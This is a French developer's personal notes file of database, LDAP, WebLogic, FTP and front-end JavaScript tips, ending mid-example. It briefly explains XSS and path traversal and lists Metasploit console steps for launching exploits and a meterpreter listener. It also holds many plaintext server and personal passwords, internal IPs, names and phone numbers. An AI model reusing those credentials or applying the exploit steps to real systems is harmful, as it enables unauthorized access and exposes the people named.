        xss//crosssitescripting // ma servlet vulnerable fait executer au navigateur du javascript passé en parametre de ma requete. ce javascript pourrait lire mes cookies (de session!): LINKcooklskjhh et le pirate de se connecter à ma place
        pathtraversal// une servlet renvoit n'importe quel fichier ! ex: monsite/maservlet?vachercher=/unpath/unfichierANeSurtoutPasMontrer !affiche le fichier!    
        redirectionexterne // une servlet redirige vers un autre site! http://monsite?maservletTresConne?forward=http://un_autre_site
    metasploitable :
        /usr/share/metasploit-framework
        chemin prog pour pirater :     /modules/exploits/...
        >msfupdate // mettre à jour metasploitable
        >msfconsole // demarrer la console metasploit
            >help
            >show exploits ou auxiliary ou payloads (en fait c le chemin /exploit ou /auxi...) // pour afficher tous les programmes par type exploit ou aux...
            >info /chemin/prog/exploit ou auxiliary/pour/pirater/fichier.rbSans.rbALaFin (utiliser tab) // pour avoir plus d'info sur le programme 
            >use /chemin/prog/exploit ou auxiliary/pour/pirater/fichier.rb //utilise le prog de piratage "fichier.rb"; puis faire show options pour voir les options de ce prog; puis set les_options pour def les options; puis enfin >exploit ou >run pour executer le prog.
                    tab possible.
            >use exploit/multi/handler // pour utiliser la "charge utile" qui sert à ecouter listener l'ouverture de faille; Puis >exploit; dès que le listener capte l'entree dans la faille: meterpreter (c un payload) est prêt. >help pour voir les commandes dispo
reseau tracer:     utiliser fiddler (onglet inspector) wireshark whireShark; sniffer utiliser NMap: sur kalilinux: https://svn.nmap.org/nmap/docs/nmap.usage.txt ou bien Tcpdump (no suitable device found veut dire que je n'ai pas les droits en non-root) sur linuxunix (http://lea-linux.org/documentations/Tcpdump) ou en java: jpcap 
    OSI  =standard contient 7 couches et chacune contient plusieurs protocoles 
           Pour  -1 unite=bit(1 ou 0 Physique) couche contient plusieurs protocoles
          *La    -2 unite=trame (1000110...Liaison) (adressage physique MAC =numero d'identification UNIQUE d'un periferique)
          *Route -3 unite=packet (Reseau adressage logique IP non fixe à un materiel) routage Ethernet.
          *Tu    -4 unite=Datagramme (Transport (tcp, udp)) pour verifier que les donnees envoyees sont bien reçues en entier: port source/port dest. Ack = accuse de reception; flags=exemple:"j'envoie", "je reçois"
           Suis  -5 unite=donnee Session
           Pierre-6 unite=donnee Presentation chiffrement/dechiffrement 
          *Alain -7 unite=donnee Application (http))
    TCPIP TCP/IP est un autre standard + simple(n'a que les * ci-dessus) qui ressemble à OSI. TCPIP c ce qui est utilise pour Internet.

                  
  proxy et reverse proxy :
      proxy: (sert à aller sur internet avec un contrôle) 
          (home pc)reseau prive ---[]---> Internet 
                               <---[]---- 
      reverse proxy: (set a contrôler les attaques possibles de l'exterieur) par exemple gerer la charge exemple : Nginx
          (The world) clients -----[]---->Mon serveur
                             <-----[]---- 
      reverse proxy + load balancing exemple F5 (coute cher)
        the world --une seule url-->[F5]----------->mon serveur 1 (une autre url cachee)
                                      \--------->mon serveur 2 (une autre url cachee)
                                        -------->etcetc... 
       une machine peut avoir plusieurs adresses ip et hostname : une par interface reseau.
  
                       

si la console weblogic sur la mco indique out of memory error: enlever des applis de la console dans 
domain-default>servers>console>onglet deplyments>webapplications: mettre tout dans available et rien dans chosen.
A première vue il faudrait changer à  peu près tous les scripts de lancement des applications :
on trouve la ligne suivante :
JAVA_OPTIONS=" -ms256m -mx256m -verbose:gc -XX:NewSize=64m -XX:MaxNewSize=64m " (a mettre juste apres la commande java et avant le reste: classpath...)
il n'est pas normal d'avoir l'option -ms256m  et -mx256m
il faudrait basculer la première à  -ms64m et la deuxième à  priori à  -mx128m sauf si l'appli est vraiment consommatrice de memoire (à§a existe !) auquel cas -mx256m est pas mal

mantis: mysql:
aller sur program files/easyphp/mysql/bin
mysql -u mantis -p
password:mantis
use mantisDSII
pour executer un fichier:
source chemain_fichieretnomfichier.sql

pour creer un user mysql et puis une base (javadude sera le mot de passe du user):
   
 mysql> GRANT ALL PRIVILEGES ON *.* TO javauser@localhost 
    ->   IDENTIFIED BY 'javadude' WITH GRANT OPTION;
mysql> create database javatest;
mysql> use javatest;
mysql> create table testdata (
    ->   id int not null auto_increment primary key,
    ->   foo varchar(25), // ici ca veut dire qu'il met 200 bytes (pas 25 caracteres) si on veut 200 caracters il faut mettre VARCHAR(25 char) sous reserve que le paramètre de base NLS_LENGTH_SEMANTICS soit positionne à  sa valeur defaut : BYTE).
    ->   bar int);
               key c'est les index
               auto_increment equivalent de la sequence sur oracle. Commence à compter à partir de.

Groupnet: 
Pour supprimer des entrees dans le ldap utiliser ldapbrowser... ca marche top du top

pour importer un ldif dans le LDAP:
dabord sauver ce qui est sur le LDAP c a d faire un export:
db2ldif -o nom_fichier_qu_il_va_creer.ldiff
ensuite faire l'import:
ldif2db -i nom_ficher_existant_qui_contient_les_nouvelles_donnees.ldiff
quand on fait ca, il integre les donnees dans le ldap, mais si elles certaines sont deja existantes, il ne les touche pas: c comme si on dezippait un .zip dans un repertoire existant
sous opt/IBMldapc lancer /ldapmodifyd -f nomfichier_a_importer_et_a_jour.ldif -D "cn=root" -w "edfgroupnet" pour modifier les entrees existantes: les mettre à  jour quoi.
on peut aussi faire une recherche:
./ldapsearchd  -D "cn=root" -w "edfgroupnet" -b "ou=correspondants, o=edfgdf-extranet.fr" "cn=r*" "sn"


Groupnet: pour remplacer la base de recette par la base de prod:
tout est dans clgrpns1 home00/mntegn/Install/tmp_oracle/dump
faire un df -k pour verifier qu'on a suffisemment de place: 
1 Mo devrait suffire (1 xxx xxx)
1.000.000 kilo = 1Giga Go
1.000 kilo = 1 Mega Mo
MCO = repertoire de sauvegarde, Prod= prod
sauvegarder la base courante:
modifier exp_db_egn.sh de maniere à  ce que le nom du dump comporte la date d'aujourd'hui.

se connecter sous oracle sur l'instance DB_EGN et executer le script exp_db_egn.sh
et bien sur si je veux importer juste la base JIVE, (arreter par groupnet stop avant puis)je me connecte sous l'instanc JIVE_EGN of course.. voir le fichier imp_jive.sh pour decompresser un XXX.Z faire:
uncompress XXX.Z
modifier imp_db_egn.sh de maniere à  ce que tout soit coherent, 
Arreter groupnet: groupnet stop
se connecter sous Oracle sur l'instance DB_EGN (ou pas car dans le script imp_db_egn.sh il se connecte sur l'instance)
et executer le script



toad : pour voir les parametres oracle qui sont aussi dans ini.ora aller dans View>oracle parameters
on peut voir la taille des tablespace sous toad pour verifier si ils ne sont pas satures.
Chez Renault pour avoir la taille des tablespaces 
		aller sur le site de la DT sur : 
		http://www.intra.renault.fr/dtsi/intranet-rs3dt/Industrialisation/deploiement/AppliXNet/LivraisonWAS/WAS4.x/noteLivraisonWas4Was5_en.html
    http://dbm-ora001.tpz.renault.fr/dts-isid-sgbd/menu_carto.jsp choisir le Domaine de l'application (on le trouve sur LISA)
SI problemes:
. faire un drop user edf cascade apres s'etre connecte à  sqlplus en system/manager
. avec une version de TOAD Superieure, on peut modifier en direct live la Max Size de la tablespace saturee.
on peut surtout definir un autoextend
Si on a pas cette version de TOAD:
visualiser le script createTbsEDF.sql
se connecter sous oracle sur l'instance DB_EGN puis faire 
sqlplus system/manager
drop user edf cascade (cascade pour une suppression dans l'ordre)
si on a supprime le user edf, on peut toujours se connecter sous toad sous user:system password:manager
apresavroi supprime le user, on peut supprimer et recreer la tablespace avec la taille qui convient:
drop tablespace... create tablespace (voir le fichier recreateTbs_4_exemple.sql ou createTbsEDF.sql pour exemple)

remarque: les datafiles des tablespace sont dans home00/oracle/instance/DB_EGN/user: on peut y voir la taille des fichiers des tablespace



le fichier du user ldapdb2 de la base db2 se trouve sous etc/passwd/ (il y a aussi tous les autres users dedans)

il existe la commande ldapsearch sous unix pour faire des requettes ldap

groupnet: ldap connexion en admin sur exeed:
apres avoir fait "dmt &" faire vmstat 2 pour garder la session (2 pour rafficher toutes les deux secondes)
vmstat: la consomation cpu se lit sous cpu et sous us + sy

& le et commercial sert à  lancer la thread en tache de fond sous unix
dans l'interface: server>rebind: .authenticated > userDN: cn=root userpassword: edfgroupnet

si problème connexion novell:
appeller accueil DIT 475604 ou breton dit robert ou jacques malliet ou jean marc laymajoux

commande dos pour voir les ports utilises sur mon ordi: netstat (voir netstat plus haut)

les alias: c a d le nom des serveurs et adresse ip sont a definir dans C:/WINNT/system32/drivers/etc/hosts : a la modif il prend en compte tout de suite. LINKàç<çç_à

les alias sous unix: exemple : alias ll = 'ls -l' ou bien alias ll="ls -l"
supprimer l'alias: faire unalias nomdel'alias



calendra: pour faire marcher la console d'administration, il faut mettre le nom de mon ordi: pour le voir on peut faire un netstat
user: admin
pass: admin


Groupnet: pour redemarrer le serveur LDAP: regarder sur pns1 dans Scripts/groupnet : il faut d'abord demarrer db2 puis ensuite ldap


pour redemarrer la base de l'instance DB_EGN sous oracle:
se connecter à  l'instance DB_EGN
svrmgrl
connect internal
startup "nom instance"

startup pfile="/home00/oracle/Instances/DB_EGN/dbs/initDB_EGN.ora"
ou
shutdown
si le shutdown ne marche pas on peut essayer
startup force pfile="/home00/oracle/Instances/DB_EGN/dbs/initDB_EGN.ora"

si il y a un souci sur un instance oracle: bloquage d'un process, on peut faire un kill -INT ****(process appele: svrmgrl)... si marche pas... alors faire kill -9 **** qui est plus brutal.
on peut aussi faire un kill -15 qui est un kill soft.
par exemple le shutdown peut etre bloque: voir les logs pour s'en assurer. Dans ce cas faire un kill -9 de Oracle pmon et smon attendre un peu, faire un shutdown abort et un startup et là  c bon.


si j'ai l'erreur oracle ORA-01034 Oracle not available
il faut faire 
svrmgrl 
connect internal 
shutdown abort; 
startup (avec l'option pfile si besoin)

clgrpnd: login mntegn pass: egn_2000
le fichier allow se trouve sous /etc/host.allow

Groupnet: quand on fait ps - ef | grep oracle, il faut que dans la liste on voit que le liste on voit le listener tourner.. si ce n'est pas le cas, on ne 
pourra pas acceder à  la base à  distance. pour mettre en route le listener:
se connecter sur oracle: su - oracle // se connecter en tant qu'un autre utilisateur.
puis se mettre sous l'instance: adequate: 
instance DB_EGN
puis demarrer le listener: lsnrctl start (documentation dispo sur internet)
pour quitter l'instance : exit
groupnet: pour executer une requette sous unix quand on est sous une instance oracle:
sqlplus edf/groupnet@nomfichier.sql
on peut aussi faire
sqlplus system/manager@nomfichier.sql (si on va supprimer le user edf par exemple)
ou sqlplus system/manager
ca c'est pas en recette:
ou sqlplus mpf_adm/mpf_mpf@(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST=hpsd1805.sax.renault.fr)(PORT = 1521))(CONNECT_DATA=(SERVICE_NAME=ml4ut8)))
si ca ne marche pas c'est parce qu'il faut enlever toute la partie ADRESS_LIST de l'adresse.
ou sqlplus pae_adm/pae_adm_01@ml4ut8
ou sqlplus cdd_adm/cdd_adm@CDD.DEV ou CDD.DEV est declare dans le tnsname


en recette:

commit;

executer sqlplus sur windows: demarer>oracle etc etc... 
on peut se connecter sur egn.
pour executer un fichier sql ou pkg via sqlplus faire ouvrir>fichier>cliquer sur un fichier du repertoire ou il y a le fichier qu'on veut executer
sqlplus nous repond "comande get non autorisee" mais on arrive dans le bon repertoire. ensuite pourexecuter le fichier qu'on veut on tape @fichierqonveutexecuter.sql ou .pkg

doc de livraison GroupNet: Q:\Maintenance GP\RESTAURATION\EGN\DOCUMENTATION\MIN
doc d'installation groupnet: Q:\INTERNET\MAINTENANCE_GP\COMMUN\DOCUMENTATION\MIN

Alain BERTRAND : 457580

prodis: si erreur weblolo LDAP_PWUSER regarder le ejb-xml de User.jar
prodis: si les entetes, et les js ne se chargement pas: verifier la casse des noms de haut_EDF.jsp haut_GDF.jsp

prodis en prod: loggin: laurent.duverge@edfgdf.fr  mot de passe: duvergeprodis

lotus: pass: duverge

Accès mantis pour mise à  jour : 
user: administrateur
mdp : mco_mco
D:\Program Files\nusphere\apache\htdocs\mantisDSII
php-myadmin : http://130.98.233.153:9102
mon mot de passe mantis (si besoin) : kfourar, kader 

mantis: login: lduverge pass: laurent123
acces internet: login: laurent.duverge pass: ordi2000
prodis: 
Les accès :

Serveur : clxs0ab (130.98.233.104)

user : mcogp3, mco1000

Fichiers logs : 
- Prodis        : /var/log/weblogic/PRODIS/
- Weblogic : /var/log/weblogic/default/WLS1-01SP2.log

Si tu as besoin de stocker des fichier sur le serveur, les mettre dans :
/home/mcogp3/users/lduverge
weblogic clxs0ab:
system
zazou!zazou!
ne pas essayer 3 fois!!


ejb:
exemple de code general qui utilise les bean, les home et remote interface:
CustomerHome home = 
// Get a reference to the 
//CustomerHome object 

Customer customer = 
  home.create(new Integer(33));

Name name = new Name("Richard", 
       "Wayne", "Monson-Haefel");
customer.setName(name);

Enumeration enumOfCustomers = 
          home.findByZip(55410);

Customer customer2 = 
     home.findByPrimaryKey(
               new Integer(33));

Name name2 = customer2.getName();

// output is "Richard Wayne 
//Monson-Haefel"
System.out.println(name);




Pour relancer le serveur: 
xvision: hbardet rv/d11
entree, entree
export DISPLAY= 172.20.2.98:0.0
x fb08
entree, entree
devel devel
ra

commande dos pour envoyer un message sur une autre ip: netsend


M. Coperet: s'occupe des frais de transport
Standard coeur defense: 0149673000
olymp:
weblogic:
user: system
password: lduverge

mon chef: david ferreira
ma secraitaire: Estelle Briere
fax:0149018550 pour envoyer les frais
fax jours conges: 0149018550

plorcy: 560490
https://clxs0aa/

ESP: pour arreter le serveur apache sous clxs0aa: faire un telnet dessus se connecter avec le user mntwgc pass: wgc2000 faire sudo su - . Si on fait ps -ef | grep 'httpd' on se rend compte que apache est sous /logiciels/apache1.3.19/bin y aller et faire apachectl stop


FRONT OFFICE	front	test.cgey edfonline
BOES		admin	admin admin
BOCO		com	marie-helene.adam edfonline
BOM		bom	market.cgey edfonline

wincvs: nouveau programme: Create > Checkout > mettre le chemin du serveur et ou on veut 
avoir ses fichiers importes. C tout.

cvs: user/password: :pserver:lduverge@clwgcdm:/users/cvsadmin/repository
mot de passe: mongi@mco














Anomalies:
1 Front > Mes services > EJP > Visualiser l'historique : renvoit à  la page d'acueil au lieu de pouvoir visualiser l'historique

code html pour faire des poplink
<a onMouseOver="poplink('Le tarif  jaune s\'applique aux contrats souscrits pour une puissance comprise entre 36 et 250 kVA.<br><br>L\'option base distingue :<br>- Deux p&eacute;riodes saisonni&egrave;res : <strong>Hiver</strong> (5 mois de novembre &agrave; mars inclus) et <strong>Et&eacute;</strong> (7 mois d'avril &agrave; octobre inclus)<br>- Deux p&eacute;riodes horaires : <strong>Heures Pleines</strong> (16h par jour, 7 jours par semaine) et <strong>Heures Creuses</strong> (8h par jour &eacute;ventuellement non contigà¼es, 7 jours par semaine)<br><br>Soit 4 p&eacute;riodes tarifaires :<br>- <strong>HPH</strong> (Heures Pleines Hiver - voir Â§ Jaune Utilisations Moyennes)<br>- <strong>HCH</strong> (Heures Creuses Hiver)<br>- <strong>HPE</strong> (Heures Pleines Ete)<br>- <strong>HCE</strong> (Heures Creuses Ete)');" onmouseout="killlink()" ><img src="/front/french/mes_services/tableau_bordbasic/visualisation/img/loupe_small.gif" width="18" height="28"></a>

ftp :
  si error 425 passer du mode passif vers le mode actif
possible de faire du ftp sur invite de commande:
ftp clwgcdm (clwgcdm = nom du serveur)
mot de passe = ??? chais pas
la, on peut naviger: cd, ls...
bin (passer en mode binaire de transfert)
ascii (passer en mode ascii de transfert) (le faire imperativement pour les fichiers textes sinon apres les ksh marchent pas)   LINKf9t8p2
put nomfichier // envoyer qu'un fichier
get nomfichier // recup qu'un fichier
prompt // pour qu'il ne demande plus à chaque transfert autorisation
mget * // recup tous les fichiers
mput * // envoyer tous les fichiers
tapper prompt pour pour forcer puis ensuite mget.

pap.fr: de particulier a p: laurent foulure

installation de l'appli
tout reimporter avec wincvs: on fait checkout. (pas import: import sert en fait a exporter vers le serveur)
creer nouveau projet dans jbuilder en definissant sources et class et les librairies
compiler. si erreurs: possible du à  fichiers en lecture seule dans class
lancer le programme matchConfig.java en renomment le fichier webtemplate.xml.dev
 en webtemplate.xml et en mettant les
web.xml en lecture ecriture
dans le repertoire DeploiementWebLogic, lancer le batch faireleEAR.bat (au prealable le lire un peu au cas ou modif
necessaires)
Il se cree un fichier EOL.ear qu'il faut deplacer sous... (voir avec weblogic)
Dans weblogic, dans les objets concernes, dans l'onglet Target, passer myserver dans chosen
changer aussi C:\bea\wlserver6.1\config\mydomain\startWebLogic.cmd: le Classpath doit tout contenir et notemment 
le fichier properties sinon dans l'appli eol/forms, il n'y aura pas le chemin de situation affiche à  l'ecran

JQuery :
  $("p") : tous les <p> ex : $("p").draggable() // sont tous draglable
  sinon ".maclasse" "#monid"
  fonctions : 
        .resizable()
        .sortable({axis:y}) pour draguer en reordonant des lists <li>
        .click() il clique sur le bouton automatiqement
        .click(function(event_optionel){blablabla}) là non: il cree un event sur l'objet et execute la fonction quand l'utilisateur clique
        convertir un objet du dom en objet jquery pour lui faire faire ce que je veux comme ci dessu s: 
        var h = $(mondomobjet); ou $("<p>blabla</p>");
        h.commeAuDessus..
        parcourir for : 
              monarray.eatch(function(index, item){ console.log(item); console.log(item)});
fancybox : // pour faire des caroussels
        	<link rel="stylesheet" type="text/css" href="https://www.wenhuaduverge.com/js/jquery/plugins/fancybox/jquery.fancybox.css">
        	<script src="https://www.wenhuaduverge.com/js/jquery/jquery-1.11.0.min.js"></script>
        	<script src="https://www.wenhuaduverge.com/js/jquery/plugins/fancybox/jquery.fancybox.js"></script>
        	<script>
        	$(document).ready(function() {
        
        	/* This is basic - uses default settings */
        	
        	$("a.single_image").fancybox();
        	});
        	</script>
        <a class="single_image" href="https://www.wenhuaduverge.com/modules/amazzingblog/views/img/uploads/posts/11/2-59aae3efb1c90.jpg"><img src="https://www.wenhuaduverge.com/modules/amazzingblog/views/img/uploads/posts/10/1-59a50232f1ff2.jpg" alt=""/></a>              
              
AngularJS1 : Angular1 :
           'use strict'; // pour interdir les variables globales par le navigateur
          // appli demoApp
          var demoApp = angular.module('nomDeMonApp', // notre app est aussi un module                                                                     <!DOCTYPE html><html lang="fr" ng-app="nomDeMonApp">
                      [// Dependances du "module nomDeMonApp"                                                                                           <head><meta charset="utf-8" /><title>Todo List</title>...</head>
                      'todoList','autredependance',...                                                                                                                  
            ]);                                                                                                                                      
           //declaration module todoList                                                                                                                      
          var todoList = angular.module('todoList',[]);                                                                                                    
          //controlleur de todoList                                                                                                                        
          todoList.controller('monControlleur', ['$scope' ou bien on met this,'$autreserviceoptionnel','moduleeventuel' //$scope!=this                     <section ng-controller="monControlleur">
                function ($scope) {                                                                                                                          
                   //declarations de variables                                                                                                               
                  var todos = $scope.todos = [];                                                                                                             
          
                  //methode
                  $scope.addTodo = function () {                                                                                      <--appelle----         <form id="todo-form" ng-submit="addTodo()">
                      ...                                                                                                                                        
                      var newTodo = $scope.newTodo.trim();//$scope.newTodo est donc le value de mon input         <---va dans le controlleur des la saisie--- <input id="new-todo" placeholder="Que devez-vous faire ?" ng-model="newTodo" />
                      todos.push({a:a,b:b}); A l'execution, met à jour tout de suite le template-----POINTEUR?!-------------                               </form>        
                      $scope.newTodo = ''; --->set le champ dans le template value =''--->                                  \                                                                   \                                       
                ]                                                                                                              \                                     
                );                                                                                                                \                          <article ng-show="todos.length"> //ng-show n'affiche <article que si todos.length>0        
                                                                                                                                                                                                  <button class="btn btn-danger" ng-click="clearCompletedTodos()">Supprimer les tâches cochees</button>
angular : Angularjs2 : ANGULAR2 : typescript :
  monprojet
  |_monfichier.ts // si il s'appelle app.ts c'est mon composant root
  |_monfichier.js (genere par le compilateur ts)
  |_monfichier.js.map (genere par le compilateur utile pour debugger sur chromedev)
  |_node_modules : les dependances recup du repository lors de l'execution "npm install" dans le projet                                                                                                        
  |_package.json : equivalent du pom.xml
  |                    script contient des alias: faire npm unalias
  |_tsconfig.json : config du compilateur typescript -> javascript
  |_typings.json : gere utilisation de librairies javascript externe
  |_index.html: contient <monrootcomposant> par ex : <my-app>
         COMPONENT: est une Directive avec en plus un template. Ne doit contenir que la logique de sa view.   
          import {Component, View} from 'angular2/angular2';
          import {unAutreComposant} from './pathtRelatif/vers/unAutreComposant'  (sans .ts a la fin)
          @ComponentGENERIQUEEVITERDUTILISERUtiliser@Named({ // P utiliser car import ci dessus 
            selector: 'my-app' // c'est un selector xml <my-app>  tout mon composant sera dedans
          })
          @View({
            templateUrl: _settings.buildPath + '/components/app/app.html',
            ou 
            template:'{{mavariable}}blablablabHTML balbla<unAutreComposant></unAutreComposant>',
            ou sur plsrs lignes
            template:`blablablabHTML balbla{{mavariable}}
                      <unAutreComposant></unAutreComposant>`,
            directives: [unAutreComposant, AttributDuneBaliseParEx, RouterLink, RouterOutlet]
          })
          export class MyApp {
            name: string;   
            mavariable:string = "tatata"; (string pas obligatoire car variable initialisee)(si je change cette variable, il change automatiquement dans la vue)
            constructor(@Inject(Router) router: Router) { // premiere facon de configurer le routeur
              this.name = 'Alice';
              router.config([
                { path: '', as: 'home', component: Home },
                { path: '/about', as: 'about', component: About }
              ]);
            }
          }    
           @RouteConfig([ // deuxieme facon de configurer le routeur
            { path: '/', as: 'home', component: Home },
            { path: '/about', as: 'about', component: About }
           ])
          VIEW
            boucler un array
                `<xx *ngFor="#mesvariable of mesvariables">
                {{mesvariable}}</xx>`

Typescript :
    tsc fichier.ts // commpile en .js
      Voici une documentation à jour sur l’utilisation de TypeScript au sein d’un projet 4YOU : 
      http://hra-wiki.ptx.fr.sopra/display/NUXE/Utilisation+de+TypeScript
      http://hra-wiki.ptx.fr.sopra/display/NUXE/Le+widget+Form
      Cette documentation decrit la procedure d’installation ainsi que la configuration necessaire, via un code d’exemple.
      
      	CHANGEMENTS
      Au sein du widget Form, il est desormais possible de debugger son code dans le navigateur directement au format TypeScript 
      (debugger du code JavaScript transpile, utilisant les generateurs, decorateurs, … n’est pas chose facile !).
      Il n’y a rien à faire de special : la configuration TypeScript du composant à ete mise à jour afin de supporter le source mapping.
      Cela est applique à partir de la version 2.0.X du widget Form.
      
      De la documentation supplementaire sera redigee concernant les outils et bonnes pratiques front-end sur 4YOU.
      
      Cordialement,
      


Javascript :
    possible de mettre a jour le texte du css avec du javascript mais tout d'un coup pas possible (pas trouvé) de façon chirurgicale
        document.getElementById("identifiantDeMaBaliseStyle").innerHTML
  pour savoir si une variable est un chiffre: 
    isNaN(toto); 
  pour avoir la proportion taille d'un element en pixcel au lieu de pourcentage largeur
      monelement.clientWidth
    savoir si un string est vide :
        if(!lestring) renvoit true si c'est null, undefined ou "". 
        du coup si je veux passer que si'il est defini faire
        if (!lestring==false)
    incrementer une valeur de margin-top sans prise de tete avec "px" pas besoin de faire substring:
         parseInt(element.style.top,10); renvoit une valeur numerique sans le string "px"
        donc element.style.margin-top=parseInt(element.style.margin-top,10)+5+"px"; marche :-)
    traitement des variables dans des strings type template :(template literals) 
    console.log(`aaaa ${supportsCustomElements}`); // plus besoin de faire "sldfkj"+xxx Pas supporte sur IE11. Pour que ca marche bien mettre `` et non pas des guillemets
            exemple: `<div><img onclick="closeUpdateRecordBoucle('${fichiermixttemp}','${fichiermixttemp}');"/></div>` dans un template
            on peut meme faire des conditions avec templates: gabarit :
                `duhtml
           	        ${versionPro?    // ou versionPro=="machin"
                        `duhtmlsioui`
                        :              // cette partie est a mettre obligatoirement pour que ca compile
                        `duhtmlsinon` 
           	            }
           		suiteduhtml`;
    existe un moteur de template de type velocity: nom: mustache pourri regarder plutot template literals
        import mustache from '/mustache'; (besoin utiliser petit serveur voir npm) ES6 
            mamethode(colonnes, lignes){
              const template= `<table>
              <thead> <tr>{{#colonnes}}<th>{{.}}</th>{{/colonnes}}</tr></thead>
              <tbody>
              {{#rows}} // boucle sur les lignes
                <tr>{{#.}}<td>{{.}}</td>{{/.}}</tr>
              {{/rows}} // fin boucle sur les lignes
              </tbody>
              </table>`.replace(/\n\s*/g,'');
              return mustache.render(template,{colonnes,lignes});
              };
            
            }
tester avec jest :
    npm install --save-dev jest
    les fichiers de tests doivent s'appeler xxxx.test.js            
tester le javascript avec Jasmine : et testem : (sinon utiliser https://jsfiddle.net/)
      installer testem: (pas besoin d'installer jasmine)
          npm install testem -g (installe testem globalement sur mon systeme)
          ensuite je peux executer en ligne de commande >testem là où se trouve mon javascript ou un fichier testem.json qui contient: 
                                {
                                    "framework": "jasmine",
                                    "src_files": [
                                      "static/*", // chemin vers les fichiers js de test jasmine
                                      "hello_spec.js" // chemin vers les fichiers js de test jasmine
                                    ]
                                    "src_files_ignore": ["js/toxic/*.js"] // fichiers à ne pas tester
                                  }
          testem --help
          npm install phantomjs-prebuilt
          testem -ci // execute mes tests sur tous les browsers (facultatif  : --launch PhantomJS(choix d'un browser)
          testem launchers //pour savoir quels browsers peuvent seront utilisés pour mes tests :  
      nomMonFichierJavascript-test.js
          describe("nom de mon testSuite",()=>{  // equivalent de ",function(){"
              describe("je peux imbriquer les describes",()=>{
                  beforeEach(()=>{ // comme @before: s'execute avant chaque "it" sibling .
                     ... initialiser chaque test                  
                  });
                  it("nom de mon test je crois",()=>{
                    var unobjetdom=$("<input class='name'>").appendTo("body"),
                    unautreobjet=$("<buton...").appendTo("body");
                    ...
                    unobjetdom.val("blabla"); // je set l'attribut value de mon node dom je crois
                    unobjetdom.click(); // je simule le click sur un node
                    expect(unobjetdom.text()).toEqual("blabli");
        pour executer ce test : 
          >testem ci --launch PhantomJS
ES6 :modules: une page peut importer une page qui importe aussi: le browser gère les doublons si yen a // pas implemente dans firefox et safari?
        Top pour faire du singleResponsabilityPrinciple
        pour que ca marche ne plus mettre 
            <script type="text/javascript" src="... 
            mais 
            <script type="module" src="... 
        dans main.js: 
              import {toto,
                      blabla
                     } from "./path/xxx";
        dans path/xxx.js:  
            export var toto =.... 
            export function() blabla(arg){...}
  avant dans un .js charger en ajax un autre .js et faire eval sur le retour pour executer.
  avant: dans un .html creer un src et l'ajouter au document          
  avant: methode ancienne: <link rel="import" href="laurent-moncompoentn1.html">              
              
detecter si les cookies sont activés ou pas disabled enabled
          // within a window load,dom ready or something like that place your:
          checkCookie();
              function checkCookie(){
                var cookieEnabled = navigator.cookieEnabled;
              if (!cookieEnabled){ 
                  document.cookie = "testcookie";
                  cookieEnabled = document.cookie.indexOf("testcookie")!=-1;
              }
              return cookieEnabled || showCookieFail();
          }
          function showCookieFail(){
            // do something here
          }
          
pour echaper echappe escape decoder html caracteres speciaux
    remplacer toExecute.innerHTML; par toExecute.childNodes[0].nodeValue; ou toExecute.innerText;
async await :
  permet d'executer du code asynchrone comme s'il etait synchrone et le javascript fait une pause tant qu'il n'a pas la réponse de l'asynchrone.
  async function unemethode(){  // dans une methode comme ca marquée async j'ai le droit de mettre await. Mais je crois que async renvoit toujours une promese.
      let res = await uneautremethodequirenvoitunepromise(); //await doit etre devant une promesse renvoyee. Alors l'execution de async se met en pause jusqu'à ce que la promise soit résolue
      return res; // await a converti la promise en valeur retournée par celle ci
  }
erreur : (intermediate value)(...) is not a function
    c a d il manque un ";" qqpart.
    
    lambda en javascript fonctionnal programing functionnal programing:
        var newNumbers = tableau.filter(function(number,indexFacultatif){ // indexFacultatif si on a besoin de l'index ouaou. :-)
              return (number % 2 !== 0); //filtrer. doit retourner un boolean// ne rien modifier dedans
          }).map(function(numberEstLeFils,indexFacultatif){ // on peut aussi faire dujson.map(unemethodeTemplate) avec function unemethodeTemplate(json){return 'bla${json.propriete}bli'} templating du json!
              return numberEstLeFils * 2; // Modifier. Ne pas modifier d'objets externes la dedans
          })    // retourne un tableau exactement comme celui en entree mais avec les modifs qu'on a fait dedans. Pas possible de renvoyer les fils: pour ca il faut .filter
          .map(function(number){
              return number + 2;
          })
          .reduce(function(carry, number){            return costCategories.values().stream().map(cost->cost.visible).reduce((carry,elt)->carry+elt).get();
                return carry + number;
            }, 0)
            .forEeach((numbers)=>{ // equivalent: .forEach(function(number){//ATTENTION E majuscule
                    ou(index,value)   
                doSomethingWith(number); // faire un traitement... a creuser
            });;
        par exemple cherche dans un tableau si les valeurs existent dans un autre tableau: boucle imbriquee :
          if(unTableauAParcourir.filter(function(act,idx){return unAutreTableauAParcourir.filter(function(actor){return actor == idx;}).length>0;})
                                                 .filter(function(act){return (act!=null //sur le resultat de l'imbrication on peut enchainer avec dauters filtres
                                                                                && act[Math.floor(document.getElementById(lecteur).currentTime)]!=undefined
                                                                               && act[Math.floor(document.getElementById(lecteur).currentTime)]!=null)})
                                                 .length>0)
    http://jshint.com // existe un plugin maven : sert à verifier la syntaxe javascript
    on peut faire un prompt browser: 
        window.prompt("maquestion");
  chargement asynchrone de css: 
      <link rel="stylesheet" href="css.css" media="none" onload="if(media!='all')media='all'">
      <noscript><link rel="stylesheet" href="css.css"></noscript>
      
  avant function toto(tata){titi} ou toto= funcion(tata){titi} APRES: toto=(tata)=>{titi} ou anonyme (tata)=>{titi} ou tata=>{titi}
  var const let :
      var ne sort pas du scope d'une fonction si il est declare dans la fonction. Sinon il est global.---> ne plus utiliser var!
      let reste cloisonne dans les {} dans lesquels ils sont declares.
      const c comme let sauf qu'on ne peut pas reassigner. on peut le modifie mais si on le reassigne ca fait une erreur
      bonne pratique reduire le nombre de variable modifiees: utiliser de preference const>let>:-( var
      
Composition=factoryfunctions tacobell taco bell Linkfactoryfnct: voir plus bas prototype fonctionnal programming functionnal programming LINKpptypeksdf
    creer ma methode de composition: 
         export function compose (...funcs){
          let result=null;
          funcs.forEach((fn)=>result=fn(result));
          return result;}
   puis definir des methodes simples utils qui peuvent se piper s'enchainer
   executionEnChaineDecomposition(){
           return compose(
            ()=>this.unobjet.uneMethode(),
            ()=>this.unobjet.uneAutreMethode(),
            uneMetode,
            (result)=>uneAutreMethode(2,result)
           );
     }
promesses : promese :promeses :Promises :promise : ne plus utiliser les callbacks
      function mamethodeQuiRetourneUnePromesseDoncDedansCestToujoursAsychrone(value) {  
              let promesse= new Promise(function(resolve, reject) { // des lors quand new Promise est appelée, elle est executée (pas besoin de .then pour ça)
                                          // un truc asynchrone: genre ajax call
